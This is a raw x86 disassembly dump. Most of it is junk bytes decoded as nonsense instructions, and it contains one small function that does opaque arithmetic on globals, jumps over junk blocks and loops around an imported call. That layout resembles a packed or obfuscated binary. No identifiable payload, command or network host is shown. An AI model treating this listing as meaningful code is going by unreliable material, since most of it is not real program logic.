  409974:	fld    QWORD PTR [eax+ecx*2]
  409977:	test   DWORD PTR [edx-0x2bc66da3],ebx
  40997d:	lahf   
  40997e:	push   ebp
  40997f:	push   esi
  409980:	inc    esi
  409981:	adc    edx,DWORD PTR [edx+0x21]
  409984:	cdq    
  409985:	fsubrp st(2),st
  409987:	add    al,0x8a
  409989:	jo     0x4099e6
  40998b:	test   BYTE PTR [edx+0x3bddddb6],bl
  409991:	clc    
  409992:	and    esp,DWORD PTR [ecx+0x67]
  409995:	pop    ss
  409996:	dec    eax
  409997:	arpl   sp,si
  409999:	inc    eax
  40999a:	pop    ds
  40999b:	or     DWORD PTR [ebx+0x6adab01e],edx
  4099a1:	dec    ecx
  4099a2:	xor    eax,0xc6374bda
  4099a7:	aad    0x57
  4099a9:	sbb    eax,0x58070593
  4099ae:	dec    eax
  4099af:	cvtpi2ps xmm2,mm7
  4099b2:	push   es
  4099b3:	cmc    
  4099b4:	retf   0xb881
  4099b7:	adc    eax,0x91d82938
  4099bc:	icebp  
  4099bd:	mov    esi,0x7aef11d4
  4099c2:	add    DWORD PTR [eax],ecx
  4099c4:	pop    edi
  4099c5:	pop    esi
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fd8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e11c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e297
  4099eb:	mov    edi,DWORD PTR ds:0x42e2a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e79c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e124,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fcf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e11c
  409a3d:	sbb    DWORD PTR ds:0x42e6eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	idiv   DWORD PTR [ecx+edx*4-0x13785f09]
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a9e
  409a66:	jo     0x409a33
  409a68:	adc    esp,DWORD PTR [ecx+0x233a4df3]
  409a6e:	inc    edi
  409a6f:	sub    ecx,0xffffffed
  409a72:	mov    ch,0xa
  409a74:	jnp    0x409a4a
  409a76:	jle    0x409a88
  409a78:	push   es
  409a79:	into   
  409a7a:	adc    edi,DWORD PTR [ebx]
  409a7c:	mov    ah,0x7e
  409a7e:	lds    esp,FWORD PTR [esi]
  409a80:	xor    esp,DWORD PTR [esi]
  409a82:	jle    0x409a69
  409a84:	lods   eax,DWORD PTR ds:[esi]
  409a85:	icebp  
  409a86:	or     edi,0xfffffffd
  409a89:	out    0xd8,eax
  409a8b:	sbb    al,0x9a
  409a8d:	sbb    eax,0x2c5d6b47
  409a92:	xor    DWORD PTR [esi+0x3f96c79b],ebp
  409a98:	outs   dx,BYTE PTR ds:[esi]
  409a99:	mov    ebp,eax
  409a9b:	pop    eax
  409a9c:	repnz loop 0x409ac7
  409a9f:	mov    dh,BYTE PTR [esi+0x10]
  409aa2:	popf   
  409aa3:	and    ah,BYTE PTR [edx+eiz*4]
  409aa6:	adc    eax,DWORD PTR [ebx-0x74]
  409aa9:	repz cmp cl,BYTE PTR [edx]
  409aac:	sub    eax,0x3cffd7d5
  409ab1:	sub    ecx,edx
  409ab3:	mov    ds:0xefc442a1,eax
  409ab8:	jae    0x409b0a
  409aba:	or     al,BYTE PTR [eax+0x23332417]
  409ac0:	mov    esi,0x35d90987
  409ac5:	pop    edx
  409ac6:	aaa    
  409ac7:	comiss xmm0,DWORD PTR [edi+0x522742ba]
  409ace:	retf   
  409acf:	rol    edi,0xf4
  409ad2:	int3   
  409ad3:	pop    eax
  409ad4:	clc    
  409ad5:	imul   ebp,edi,0x41
  409ad8:	pop    ss
  409ad9:	arpl   WORD PTR [ebp-0x1a01cdd4],di
  409adf:	mov    ecx,0x741709d7
  409ae4:	loop   0x409aa3
  409ae6:	xor    al,0xfe
  409ae8:	out    0x8f,eax
  409aea:	xchg   edx,eax
  409aeb:	call   FWORD PTR [eax+0x2e935185]
  409af1:	sti    
  409af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409af3:	shl    BYTE PTR [esp+ebx*1],cl
  409af6:	push   ss
  409af7:	xor    BYTE PTR [edx],al
  409af9:	push   ebp
  409afa:	fisub  WORD PTR [eax-0x77d3ffde]
  409b00:	call   0x88beafd
  409b05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b06:	sub    BYTE PTR [ebp+0x1a],0x9
  409b0a:	sbb    DWORD PTR [edi+0x7ebe0903],esp
  409b10:	jl     0x409b8f
  409b12:	ret    
  409b13:	(bad)  
  409b14:	cmp    BYTE PTR [edi-0x12],ah
  409b17:	or     BYTE PTR [ebp+0x7cd58a05],dh
  409b1d:	or     edx,esp
  409b1f:	leave  
  409b20:	sub    al,BYTE PTR [ecx-0x4e5ed879]
  409b26:	pop    es
  409b27:	(bad)  
  409b28:	jne    0x409b46
  409b2a:	jg     0x409b00
  409b2c:	and    eax,0x5f2ae1c8
  409b31:	dec    ecx
  409b32:	sub    BYTE PTR [edx+ecx*8+0x778cc0cd],0x82
  409b3a:	jbe    0x409adc
  409b3c:	mov    al,ds:0xd9eadf6c
  409b41:	cdq    
  409b42:	sbb    al,0xeb
  409b44:	push   esi
  409b45:	xchg   ebx,eax
  409b46:	mov    eax,ds:0xc3ae5d5e
  409b4b:	lock push edi
  409b4d:	cld    
  409b4e:	dec    ebp
  409b4f:	sub    bh,BYTE PTR [edi-0x50f4a0bd]
  409b55:	cmp    DWORD PTR [ecx+0x3a167cd],esi
  409b5b:	and    eax,0xae28e0ff
  409b60:	loope  0x409bb3
  409b62:	sub    ch,dl
  409b64:	mov    ah,0xa6
  409b66:	lock mov BYTE PTR [eax+0x15bfd4e0],dh
  409b6d:	dec    edi
  409b6e:	jae    0x409be1
  409b70:	push   0xffffffd1
  409b72:	add    esp,esi
  409b74:	push   ebp
  409b75:	xor    ch,bh
  409b77:	pop    esi
  409b78:	inc    ebp
  409b79:	sahf   
  409b7a:	fistp  DWORD PTR [eax]
  409b7c:	push   ebx
  409b7d:	shr    BYTE PTR [ebp-0x75d29363],cl
  409b83:	jmp    0xe6fcd690
  409b88:	jp     0x409b32
  409b8a:	dec    ebx
  409b8b:	sti    
  409b8c:	ja     0x409b26
  409b8e:	popf   
  409b8f:	pop    ebx
  409b90:	fidiv  WORD PTR [ebx-0x3503e7f7]
  409b96:	das    
  409b97:	mov    ds:0xa464a91e,eax
  409b9c:	jo     0x409b8e
  409b9e:	(bad)  
  409b9f:	xor    al,0x16
  409ba1:	aaa    
  409ba2:	xchg   edx,eax
  409ba3:	loope  0x409be4
  409ba5:	mov    ebp,0x87a71f5b
  409baa:	fiadd  DWORD PTR [eax-0x65]
  409bad:	pop    es
  409bae:	xchg   esi,eax
  409baf:	fs mov edi,0x638f2efa
  409bb5:	sub    ebx,DWORD PTR [ebp+ebx*1+0x6e450411]
  409bbc:	mov    ecx,DWORD PTR ds:0xa5ab5918
  409bc2:	div    WORD PTR [esi-0x38]
  409bc6:	add    DWORD PTR [eax],ebp
  409bc8:	aaa    
  409bc9:	sbb    eax,0xd45aeb41
  409bce:	sub    DWORD PTR [esi+0x4a8633e8],0xffffffdd
  409bd5:	fwait
  409bd6:	or     esi,edx
  409bd8:	test   DWORD PTR [eax-0x7f],0x79fe6883
  409bdf:	and    DWORD PTR [ebx+0x1f1c7929],ecx
  409be5:	popf   
  409be6:	nop
  409be7:	in     al,0xfb
  409be9:	mov    DWORD PTR [esi-0x6b],0x1b58a1a7
  409bf0:	sbb    esp,DWORD PTR [ebp-0x20]
  409bf3:	fist   WORD PTR [esi]
  409bf5:	dec    ecx
  409bf6:	sbb    al,0xfe
  409bf8:	es test al,0xb3
  409bfb:	mov    edx,0x936319ee
  409c00:	xchg   ax,ax
  409c02:	in     eax,dx
  409c03:	add    cl,BYTE PTR [eax-0x54988925]
  409c09:	fsubr  DWORD PTR [ecx+edx*1]
  409c0c:	inc    esp
  409c0d:	jmp    0xf7570f3c
  409c12:	mov    esp,0x6d25a211
  409c17:	xor    al,0x1c
  409c19:	or     BYTE PTR [ecx+eax*2-0x1f1e0d0d],al
  409c20:	daa    
  409c21:	clc    
  409c22:	cmc    
  409c23:	call   FWORD PTR [esi+ecx*1]
  409c26:	loopne 0x409c20
  409c28:	scas   eax,DWORD PTR es:[edi]
  409c29:	jg     0x409bd0
  409c2b:	mov    DWORD PTR fs:[esi-0x3425a2d],0x2cada5a6
  409c36:	push   ss
  409c37:	sbb    bl,dl
  409c39:	popa   
  409c3a:	ins    DWORD PTR es:[edi],dx
  409c3b:	mov    ecx,0x8cc809c2
  409c40:	rsqrtps xmm2,XMMWORD PTR [ecx+0x7c]
  409c44:	nop
  409c45:	push   edx
  409c46:	adc    eax,0x65f21256
  409c4b:	cld    
  409c4c:	mov    edi,DWORD PTR [ebx-0x30ccbfe8]
  409c52:	enter  0xcd91,0x41
  409c56:	ss pushf 
  409c58:	arpl   WORD PTR [esi],bp
  409c5a:	sub    ecx,DWORD PTR [edx+0x4c118085]
  409c60:	(bad)  
  409c61:	jbe    0x409c4f
  409c63:	and    ecx,DWORD PTR [edi+0x27f2e2a3]
  409c69:	dec    ebp
  409c6a:	jmp    FWORD PTR [esi+0x549815d3]
  409c70:	xchg   cl,bl
  409c72:	js     0x409ce4
  409c74:	xor    eax,0x45e2cee4
  409c79:	pop    ds
  409c7a:	retf   0x1132
  409c7d:	xchg   BYTE PTR [ecx+0x4098a4b6],al
  409c83:	xor    eax,0x1c580c1e
  409c88:	jbe    0x409c9a
  409c8a:	out    0x3a,al
  409c8c:	fwait
  409c8d:	hlt    
  409c8e:	or     BYTE PTR [esi+0x7b],dh
  409c91:	adc    ah,BYTE PTR [esp+eax*2-0x6f]
  409c95:	dec    edi
  409c96:	fidivr WORD PTR [esi]
  409c98:	enter  0x90f5,0xb1
  409c9c:	cmp    al,0x76
  409c9e:	sti    
  409c9f:	mov    DWORD PTR [edi+0x40056b1c],esp
  409ca5:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ca7:	fcomp  DWORD PTR [esi]
  409ca9:	jnp    0x409ca9
  409cab:	sbb    BYTE PTR [ebx+0x53],cl
  409cae:	ds dec esi
  409cb0:	das    
  409cb1:	out    dx,al
  409cb2:	sub    eax,0xbd2ac89
  409cb7:	cld    
  409cb8:	les    edi,FWORD PTR ds:0x8f8c35d8
  409cbe:	(bad)  
  409cbf:	xlat   BYTE PTR ds:[ebx]
  409cc0:	xor    al,0xc
  409cc2:	adc    eax,0xf224388a
  409cc7:	repz (bad) [eax]
  409cca:	xchg   edx,eax
  409ccb:	cmp    ebp,ebx
  409ccd:	jl     0x409ccc
  409ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cd0:	test   DWORD PTR [ebx+ecx*1],edx
  409cd3:	jne    0x409d25
  409cd5:	(bad)  
  409cd6:	mov    dl,0x21
  409cd8:	(bad)
  409cdc:	ja     0x409d51
  409cde:	push   ss
  409cdf:	icebp  
  409ce0:	mov    dh,0xac
  409ce2:	sbb    al,0xc3
  409ce4:	or     eax,0xf3068d0
  409ce9:	or     ah,BYTE PTR [esi-0x2c]
  409cec:	mov    DWORD PTR [edi-0x73],edx
  409cef:	(bad)  
  409cf0:	dec    edi
  409cf1:	add    eax,0x192f5aff
  409cf6:	retf   
  409cf7:	clc    
  409cf8:	adc    bl,ah
  409cfa:	test   BYTE PTR [ebx+0x47703476],0xc4
  409d01:	sbb    cl,BYTE PTR [esi+eiz*2]
  409d04:	push   ecx
  409d05:	dec    eax
  409d06:	std    
  409d07:	adc    al,0x1
  409d09:	stc    
  409d0a:	pushf  
  409d0b:	and    eax,DWORD PTR [ecx+eax*1+0x6b]
  409d0f:	mov    bl,0x78
  409d11:	mov    cl,0x26
  409d13:	jle    0x409ccf
  409d15:	pop    edx
  409d16:	lods   eax,DWORD PTR ds:[esi]
  409d17:	and    esi,DWORD PTR [ecx+0x3dc051b1]
  409d1d:	scas   eax,DWORD PTR es:[edi]
  409d1e:	dec    esp
  409d1f:	ins    BYTE PTR es:[edi],dx
  409d20:	das    
  409d21:	stc    
  409d22:	sbb    DWORD PTR [ebx+0x77aae861],eax
  409d28:	mov    ds:0x2656e5c6,eax
  409d2d:	sub    DWORD PTR [eax-0x11c78ccf],ebx
  409d33:	cmp    eax,0x23d5ba7c
  409d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d39:	sbb    eax,0x4dd559cc
  409d3e:	shl    DWORD PTR [esi+0x7c],cl
  409d41:	dec    eax
  409d42:	mov    WORD PTR [ebp+ebx*2-0x27a8926f],es
  409d49:	dec    ecx
  409d4a:	mov    edi,0x7b329a15
  409d4f:	imul   edi,DWORD PTR [edx-0x6682da14],0x8a6ccd7e
  409d59:	bound  ebp,QWORD PTR [edx-0x640947f]
  409d5f:	adc    BYTE PTR [ebp-0x44],bl
  409d62:	and    dl,al
  409d64:	daa    
  409d65:	xchg   edx,eax
  409d66:	xor    al,0xb9
  409d68:	dec    eax
  409d69:	mov    edi,0x9dffe3b
  409d6e:	loope  0x409dae
  409d70:	cmp    dh,BYTE PTR [esi-0x6c6be6f7]
  409d76:	(bad)  
  409d77:	jp     0x409d7f
  409d79:	mov    WORD PTR [ebp+edx*8+0x6a],gs
  409d7d:	outs   dx,DWORD PTR ds:[esi]
  409d7e:	sar    BYTE PTR [edi],0xd4
  409d81:	call   0x855316d7
  409d86:	and    BYTE PTR [ebx-0x53],cl
  409d89:	(bad)  
  409d8a:	aam    0x16
  409d8c:	inc    ebp
  409d8d:	int3   
  409d8e:	adc    eax,0x5c8d6f5d
  409d93:	or     DWORD PTR [edx+0x29],esi
  409d96:	icebp  
  409d97:	dec    ebp
  409d98:	inc    esp
  409d99:	and    edx,ebp
  409d9b:	or     ebp,DWORD PTR [esi-0x70]
  409d9e:	in     eax,0x5f
  409da0:	mov    ebp,0x4c72f992
  409da5:	mov    esp,0x81cb3761
  409daa:	fcmovnu st,st(6)
  409dac:	push   ebp
  409dad:	stos   BYTE PTR es:[edi],al
  409dae:	push   0x12635e14
  409db3:	sub    eax,0xd03293bc
  409db8:	ins    BYTE PTR es:[edi],dx
  409db9:	mov    esi,0x292107a9
  409dbe:	ja     0x409e2e
  409dc0:	push   ebp
  409dc1:	mov    dh,0x1a
  409dc3:	xor    DWORD PTR [esi-0x23e3e291],ebx
  409dc9:	add    eax,0xe6321fe2
  409dce:	retf   0x6b15
  409dd1:	pop    ebp
  409dd2:	inc    edx
  409dd3:	call   0xd008:0xd099dd44
  409dda:	cs lahf 
  409ddc:	cmp    ebp,ecx
  409dde:	ss and ah,bh
  409de1:	aam    0x53
  409de3:	fldenv [ebx-0x12166686]
  409de9:	inc    ebx
  409dea:	lods   eax,DWORD PTR ds:[esi]
  409deb:	or     ch,bl
  409ded:	and    edx,DWORD PTR [ebx+0x3cbfda53]
  409df3:	leave  
  409df4:	scas   al,BYTE PTR es:[edi]
  409df5:	mov    al,0x3
  409df7:	xchg   edx,eax
  409df8:	push   edi
  409df9:	js     0x409e28
  409dfb:	test   al,0x15
  409dfd:	inc    bp
  409dff:	or     DWORD PTR [edx],edx
  409e01:	adc    edi,DWORD PTR [ebp+0x30]
  409e04:	jg     0x409e1a
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fd8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fcf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e124
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fd82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fd82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fd82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e2e3
  409e51:	mov    edi,DWORD PTR ds:0x42fd82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fd82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e703,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	shr    BYTE PTR [ecx+0x2c],cl
  409e84:	retf   
  409e85:	es call 0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	dec    esp
  409e8e:	cmp    bh,BYTE PTR [ecx-0x25d932aa]
  409e94:	xlat   BYTE PTR ds:[ebx]
  409e95:	test   DWORD PTR [ebx+0x61],esp
  409e98:	aad    0xab
  409e9a:	fld    TBYTE PTR [ebx+0x34]
  409e9d:	aad    0xc3
  409e9f:	in     al,dx
  409ea0:	clc    
  409ea1:	addr16 lock pop edi
  409ea4:	icebp  
  409ea5:	int    0x35
  409ea7:	jb     0x409e6d
  409ea9:	pusha  
  409eaa:	fcmovbe st,st(1)
  409eac:	fisub  WORD PTR [edx]
  409eae:	dec    eax
  409eaf:	gs cmp eax,0xb2388021
  409eb5:	data16 cmp dl,BYTE PTR [ebp-0x42]
  409eb9:	aam    0xe9
  409ebb:	cmp    bl,BYTE PTR [ecx+0x2ee9b6a2]
  409ec1:	and    BYTE PTR [ebx+0x25],al
  409ec4:	cld    
  409ec5:	mov    esp,0xdf894580
  409eca:	pop    ds
  409ecb:	out    0x9e,al
  409ecd:	stos   BYTE PTR es:[edi],al
  409ece:	dec    esi
  409ecf:	dec    edi
  409ed0:	sub    eax,0x5ede07bd
  409ed5:	mov    eax,ds:0x351ccabd
  409eda:	inc    ecx
  409edb:	outs   dx,DWORD PTR ds:[esi]
  409edc:	sbb    ebx,DWORD PTR [edx]
  409ede:	ins    DWORD PTR es:[edi],dx
  409edf:	sbb    ah,cl
  409ee1:	popa   
  409ee2:	imul   ebp,DWORD PTR [ebx-0x32],0xdb85c3ad
  409ee9:	call   0x68e:0xaaedbcad
  409ef0:	out    0x2c,eax
  409ef2:	loop   0x409e8d
  409ef4:	cmp    edi,DWORD PTR [edi]
  409ef6:	jmp    0x9a8f:0xe41caa0d
  409efd:	add    edx,0x36
  409f00:	pop    ds
  409f01:	dec    eax
  409f02:	fcomp  QWORD PTR [eax+0x4aa60d3c]
  409f08:	mov    ds:0x8c491825,al
  409f0d:	xor    BYTE PTR [eax-0x5c],cl
  409f10:	jno    0x409f7f
  409f12:	xchg   ecx,eax
  409f13:	xor    BYTE PTR [esi],bl
  409f15:	sahf   
  409f16:	add    ebx,DWORD PTR [edx-0x552c865a]
  409f1c:	pop    ebp
  409f1d:	icebp  
  409f1e:	push   edx
  409f1f:	into   
  409f20:	adc    esp,eax
  409f22:	fsubr  DWORD PTR [ebx]
  409f24:	mov    eax,ds:0x99fbc032
  409f29:	or     BYTE PTR ds:0xe9e70c5,al
  409f2f:	adc    BYTE PTR [ebx-0x6c],0x52
  409f33:	add    DWORD PTR ds:0xc0015f69,edx
  409f39:	out    0x2a,eax
  409f3b:	stos   BYTE PTR es:[edi],al
  409f3c:	pop    edx
  409f3d:	inc    eax
  409f3e:	iret   
  409f3f:	push   edx
  409f40:	mov    cl,BYTE PTR [ebx+0x3d4266e]
  409f46:	das    
  409f47:	inc    ecx
  409f48:	(bad)  
  409f49:	(bad)  
  409f4a:	in     eax,dx
  409f4b:	sub    bl,BYTE PTR [esp-0x76]
  409f4f:	xor    edi,edx
  409f51:	enterw 0xf97a,0x15
  409f56:	jg     0x409f25
  409f58:	pop    ebp
  409f59:	in     eax,0xf5
  409f5b:	arpl   WORD PTR [ebx-0x25],sp
  409f5e:	xor    ah,BYTE PTR [edx+0x529335fd]
  409f64:	push   eax
  409f65:	int3   
  409f66:	retf   0xef
  409f69:	push   esi
  409f6a:	dec    eax
  409f6b:	adc    al,0xc0
  409f6d:	call   0x2259:0x509e612d
  409f74:	in     al,0xd
  409f76:	mul    BYTE PTR [eax+esi*4+0x5a]
  409f7a:	test   al,0xe8
  409f7c:	int    0x18
  409f7e:	and    al,0x41
  409f80:	addr16 jns 0x409ff0
  409f83:	add    dl,BYTE PTR [edx]
  409f85:	xchg   DWORD PTR ds:0x500d6e15,edi
  409f8b:	(bad)  
  409f8c:	in     al,dx
  409f8d:	ror    BYTE PTR [ecx+edx*1+0x3b81f6d8],1
  409f94:	lock sbb al,BYTE PTR [ebx+edx*4]
  409f98:	sbb    cl,al
  409f9a:	sar    eax,1
  409f9c:	add    eax,0x28f43d
  409fa1:	loope  0x409fb5
  409fa3:	and    BYTE PTR es:[esi+0x59],dh
  409fa7:	vpunpckhbw ymm2,ymm0,YMMWORD PTR [ecx]
  409fab:	fwait
  409fac:	xchg   ebx,eax
  409fad:	add    eax,0x7795a13a
  409fb2:	test   edx,edi
  409fb4:	xor    DWORD PTR [eax+0x3aa56c77],esi
  409fba:	aas    
  409fbb:	lock mov ah,0x4b
  409fbe:	repz inc ecx
  409fc0:	dec    ebp
  409fc1:	pop    edx
  409fc2:	cmc    
  409fc3:	inc    esp
  409fc4:	scas   al,BYTE PTR es:[edi]
  409fc5:	mov    al,BYTE PTR [ebx]
  409fc7:	cmp    al,0x34
  409fc9:	sar    BYTE PTR [ebx+0x4b995515],cl
  409fcf:	push   edi
  409fd0:	in     eax,0xd7
  409fd2:	mul    DWORD PTR [ecx-0x5d]
  409fd5:	bswap  esi
  409fd7:	mov    edi,0x25dc94a0
  409fdc:	shr    BYTE PTR [eax-0x7634aee1],cl
  409fe2:	adc    BYTE PTR [esi],ch
  409fe4:	pop    ecx
  409fe5:	push   ebx
  409fe6:	add    al,0xe
  409fe8:	jbe    0x40a028
  409fea:	push   ds
  409feb:	sbb    DWORD PTR [eax+0x7205b6d4],eax
  409ff1:	dec    esp
  409ff2:	dec    esp
  409ff3:	mov    esp,0x90510993
  409ff8:	pusha  
  409ff9:	enter  0xafb3,0x53
  409ffd:	out    0xbd,al
  409fff:	push   0x30da5dc6
  40a004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a005:	daa    
  40a006:	mov    edi,0xc74009e2
  40a00b:	jno    0x409fa9
  40a00d:	jp     0x409ffa
  40a00f:	sbb    al,0xd9
  40a011:	repnz sti 
  40a013:	es sub esi,edi
  40a016:	pop    esi
  40a017:	push   es
  40a018:	rcr    BYTE PTR [ecx-0x7d],cl
  40a01b:	into   
  40a01c:	in     eax,dx
  40a01d:	repz jne 0x409fd3
  40a020:	xlat   BYTE PTR ds:[ebx]
  40a021:	and    ebp,ebp
  40a023:	mov    al,ds:0x83071151
  40a028:	mov    BYTE PTR [ebp+0x528f9516],ch
  40a02e:	icebp  
  40a02f:	push   ebp
  40a030:	shl    BYTE PTR [ebx],0x83
  40a033:	or     al,0xb9
  40a035:	xchg   bh,al
  40a037:	mov    ds:0x54837e8,eax
  40a03c:	ja     0x409fff
  40a03e:	sbb    eax,0x7f0f5453
  40a043:	aam    0x8b
  40a045:	imul   BYTE PTR [ecx+ebp*2-0x38]
  40a049:	inc    esi
  40a04a:	in     al,dx
  40a04b:	push   edx
  40a04d:	or     al,0x46
  40a04f:	inc    ebp
  40a050:	pop    esp
  40a051:	scas   al,BYTE PTR es:[edi]
  40a052:	mov    bl,0xa5
  40a054:	fdivrp st(4),st
  40a056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a057:	push   ss
  40a058:	sub    BYTE PTR [edx],bl
  40a05a:	sbb    eax,0x7fcc8222
  40a05f:	repz repnz pop ebx
  40a062:	inc    eax
  40a063:	cmp    ah,bl
  40a065:	popf   
  40a066:	adc    ebx,DWORD PTR [eax]
  40a068:	(bad)  
  40a06a:	(bad)  
  40a06b:	push   0xfffffffe
  40a06d:	xor    DWORD PTR [edx],ebx
  40a06f:	cdq    
  40a070:	mov    ch,0x3d
  40a072:	fs scas al,BYTE PTR es:[edi]
  40a074:	pop    ebp
  40a075:	xor    eax,0x5ca8f977
  40a07a:	or     eax,DWORD PTR [edx-0x3c]
  40a07d:	out    0xb2,al
  40a07f:	inc    ebp
  40a080:	popa   
  40a081:	inc    ecx
  40a082:	sub    BYTE PTR [edx+esi*1-0xc],ah
  40a086:	outs   dx,DWORD PTR ds:[esi]
  40a087:	jmp    0xba3c:0x634d4472
  40a08e:	data16 ja 0x40a068
  40a091:	push   0x2f805a1
  40a096:	sbb    al,0xce
  40a098:	mov    eax,0x6ef432d2
  40a09d:	and    al,0x35
  40a09f:	out    0xac,eax
  40a0a1:	test   al,0x31
  40a0a3:	sahf   
  40a0a4:	push   ss
  40a0a5:	push   esp
  40a0a7:	or     BYTE PTR [ebx+0x24671e55],al
  40a0ad:	push   ebx
  40a0ae:	fild   WORD PTR [edx]
  40a0b0:	adc    ebp,DWORD PTR [ebx]
  40a0b2:	pop    ecx
  40a0b3:	pop    DWORD PTR [ebx+0x3135f911]
  40a0b9:	sbb    edi,eax
  40a0bb:	ins    DWORD PTR es:[edi],dx
  40a0bc:	xor    BYTE PTR [edi],bl
  40a0be:	inc    edi
  40a0bf:	xchg   ecx,eax
  40a0c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0c1:	popf   
  40a0c2:	ret    0xa2fd
  40a0c5:	add    esi,DWORD PTR [edi-0x1c]
  40a0c8:	nop
  40a0c9:	out    0xa2,al
  40a0cb:	or     DWORD PTR [esi+ecx*1-0x73],0x23
  40a0d0:	fiadd  WORD PTR [edx+0x4a]
  40a0d3:	ins    BYTE PTR es:[edi],dx
  40a0d4:	test   eax,0xd12fac80
  40a0d9:	jmpw   0xfcf6
  40a0dd:	sbb    BYTE PTR [ebp-0x4f419a6e],cl
  40a0e3:	sub    al,0x6f
  40a0e5:	arpl   WORD PTR [eax],si
  40a0e7:	xor    BYTE PTR [ecx-0x7c],ch
  40a0ea:	pop    ebx
  40a0eb:	dec    edx
  40a0ec:	outs   dx,BYTE PTR ds:[esi]
  40a0ed:	cmp    BYTE PTR [ebx+0x7c],bh
  40a0f0:	call   0xd9b3:0xefae58c7
  40a0f7:	outs   dx,BYTE PTR ds:[esi]
  40a0f8:	mov    fs,WORD PTR fs:[esi-0x28a39ebf]
  40a0ff:	sbb    eax,0x52a09d3a
  40a104:	leave  
  40a105:	ja     0x40a0f7
  40a107:	fs jo  0x40a181
  40a10a:	(bad)  
  40a10b:	fnsave [esi+ebx*8+0x6d]
  40a10f:	das    
  40a110:	fmul   st(2),st
  40a112:	inc    eax
  40a113:	jae    0x40a159
  40a115:	cmp    esi,DWORD PTR [ecx+0x7a421bd3]
  40a11b:	inc    ebp
  40a11c:	adc    bh,dl
  40a11e:	pop    eax
  40a11f:	mov    edi,0x597cc3f2
  40a124:	adc    DWORD PTR ds:0x5fdb7537,eax
  40a12a:	pop    ebp
  40a12b:	sbb    ebx,edx
  40a12d:	pop    ecx
  40a12e:	dec    edi
  40a12f:	ss pop edx
  40a131:	jo     0x40a100
  40a133:	pop    ebx
  40a134:	cmp    BYTE PTR [ebx],0xb5
  40a137:	idiv   DWORD PTR [edx+eax*4-0x58]
  40a13b:	outs   dx,BYTE PTR ds:[esi]
  40a13c:	pop    ebp
  40a13d:	int3   
  40a13e:	mov    ebp,0x39c45d20
  40a143:	add    eax,DWORD PTR [esi-0x6a]
  40a146:	ins    DWORD PTR es:[edi],dx
  40a147:	xchg   ebp,eax
  40a148:	addr16 pop ecx
  40a14a:	xchg   esp,eax
  40a14b:	or     eax,0x3ee96f56
  40a150:	mov    bl,ch
  40a152:	in     al,dx
  40a153:	(bad)  
  40a154:	or     DWORD PTR [edx-0x6f13e03e],ebx
  40a15a:	div    dl
  40a15c:	xchg   BYTE PTR [ecx],cl
  40a15e:	ss daa 
  40a160:	cmp    ebp,ecx
  40a162:	mov    esp,0xcc69087d
  40a167:	mov    ds:0xa0fc6303,al
  40a16c:	inc    edx
  40a16d:	push   ds
  40a16e:	mov    esi,0x7a56713f
  40a173:	adc    BYTE PTR [esi],ch
  40a175:	sbb    BYTE PTR fs:[ebp-0x1e],dh
  40a179:	js     0x40a163
  40a17b:	push   0xc12496ce
  40a180:	inc    eax
  40a181:	out    dx,al
  40a182:	and    DWORD PTR [edx],ebx
  40a184:	jp     0x40a114
  40a186:	add    BYTE PTR [eax+ebx*4-0x14fb40fa],dh
  40a18d:	inc    ebp
  40a18e:	mov    edx,0x557122bd
